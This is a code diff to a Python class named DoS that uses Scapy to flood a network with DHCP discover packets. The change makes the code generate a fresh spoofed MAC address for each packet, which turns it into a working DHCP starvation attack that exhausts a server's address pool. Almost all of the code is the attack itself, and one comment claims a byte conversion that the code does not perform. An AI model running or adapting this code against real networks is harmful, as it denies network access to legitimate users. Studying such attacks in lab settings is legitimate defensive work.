@@ -145,13 +145,17 @@ class DoS:
         self.is_running = False
 
     def Dos_attack(self):
-        random_mac = RandMac()
-        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=random_mac) \
-                        /IP(src="0.0.0.0", dst="255.255.255.255") \
-                        /UDP(sport=68, dport=67) \
-                        /BOOTP(op=1, chaddr=random_mac) \
-                        /DHCP(options=[("message-type", "discover"), ("end")])
+        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src="") \
+                        / IP(src="0.0.0.0", dst="255.255.255.255") \
+                        / UDP(sport=68, dport=67) \
+                        / BOOTP(op=1, chaddr="") \
+                        / DHCP(options=[("message-type", "discover"), ("end")])
         while self.is_running:
+            random_mac = RandMAC()
+            dhcp_discover[Ether].src = random_mac
+            #convert to bytes for BOOTP chaddr field
+            dhcp_discover[BOOTP].chaddr = random_mac
+
             sendp(dhcp_discover, iface=self.iface, verbose=False)
 
     def start(self):
@@ -159,9 +163,9 @@ class DoS:
         conf.checkIPaddr = False
         self.__thread = threading.Thread(target=self.Dos_attack)
         self.__thread.start()
-    
+
     def stop(self):
         self.is_running = False
-        conf.checkIPaddr=True
+        conf.checkIPaddr = True
         if self.__thread is not None:
             self.__thread.join()
